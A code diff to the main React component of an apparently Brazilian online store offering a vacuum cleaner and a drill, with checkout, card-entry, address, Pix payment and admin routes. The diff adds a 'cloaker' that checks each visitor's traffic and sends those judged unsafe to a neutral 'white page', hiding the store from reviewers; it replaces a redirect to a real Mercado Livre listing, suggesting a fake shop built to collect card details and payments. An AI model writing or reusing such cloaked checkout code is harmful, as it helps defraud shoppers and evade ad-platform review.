@@ -1,14 +1,73 @@
-import React, { useEffect } from "react";
+import React, { useState, useEffect } from "react";
+import { BrowserRouter as Router, Routes, Route, Navigate } from "react-router-dom";
+import { Toaster } from "sonner";
+
+// Páginas e Componentes
+import Index from "./pages/Index";
+import AspiradorProductPage from "./products/aspirador-de-po/ProductPage";
+import FuradeiraProductPage from "./products/furadeira/ProductPage";
+import Checkout from "./pages/Checkout";
+import AddCard from "./pages/AddCard";
+import AddAddress from "./pages/AddAddress";
+import PixPayment from "./pages/PixPayment";
+import Admin from "./pages/Admin";
+import NotFound from "./pages/NotFound";
+
+// Utilitários de Proteção
+import { checkTraffic, redirectToWhitePage } from "./utils/cloaker";
 
 const App = () => {
+  const [isSafe, setIsSafe] = useState<boolean | null>(null);
+
   useEffect(() => {
-    window.location.href = "https://www.mercadolivre.com.br/rob-aspirador-eufy-omni-c20-3-em-1-estaco-tudo-em-um-succo-7000pa-corpo-ultrafino-85cm-esvaziamento-limpeza-e-secagem-automatica-mapeamento-laser-multinivel-escova-antiembaraco-wifi-app-voz-220v/p/MLB45873105?pdp_filters=item_id%3AMLB6072170418&from=gshop&matt_tool=49835134&matt_internal_campaign_id=&matt_word=&matt_source=google&matt_campaign_id=22090354217&matt_ad_group_id=194474656714&matt_match_type=&matt_network=g&matt_device=c&matt_creative=792355617033&matt_keyword=&matt_ad_position=&matt_ad_type=pla_with_promotion&matt_merchant_id=735128188&matt_product_id=MLB45873105-product&matt_product_partition_id=2454649971481&matt_target_id=pla-2454649971481&cq_src=google_ads&cq_cmp=22090354217&cq_net=g&cq_plt=gp&cq_med=pla_with_promotion&gad_campaignid=22090354217";
+    const runGuard = async () => {
+      const result = await checkTraffic();
+      if (!result) {
+        redirectToWhitePage();
+      } else {
+        setIsSafe(true);
+      }
+    };
+
+    runGuard();
   }, []);
 
+  // Enquanto verifica o tráfego, não renderiza nada da loja
+  if (isSafe === null) {
+    return (
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        {/* Tela de carregamento neutra */}
+      </div>
+    );
+  }
+
   return (
-    <div className="min-h-screen bg-white">
-      {/* Redirecionando... */}
-    </div>
+    <Router>
+      <Toaster position="top-center" richColors />
+      <Routes>
+        {/* Rotas dos Produtos */}
+        <Route path="/" element={<Index />} />
+        <Route path="/aspirador-de-po" element={<AspiradorProductPage />} />
+        <Route path="/furadeira" element={<FuradeiraProductPage />} />
+        
+        {/* Fluxo de Checkout Aspirador */}
+        <Route path="/aspirador-de-po/checkout" element={<Checkout />} />
+        <Route path="/aspirador-de-po/cartao" element={<AddCard />} />
+        <Route path="/aspirador-de-po/endereco" element={<AddAddress />} />
+        <Route path="/aspirador-de-po/pix" element={<PixPayment />} />
+
+        {/* Fluxo de Checkout Furadeira */}
+        <Route path="/furadeira/checkout" element={<Checkout />} />
+        <Route path="/furadeira/cartao" element={<AddCard />} />
+        <Route path="/furadeira/endereco" element={<AddAddress />} />
+        <Route path="/furadeira/pix" element={<PixPayment />} />
+
+        {/* Rotas Administrativas e Utilitários */}
+        <Route path="/admin" element={<Admin />} />
+        <Route path="/404" element={<NotFound />} />
+        <Route path="*" element={<Navigate to="/404" replace />} />
+      </Routes>
+    </Router>
   );
 };
 
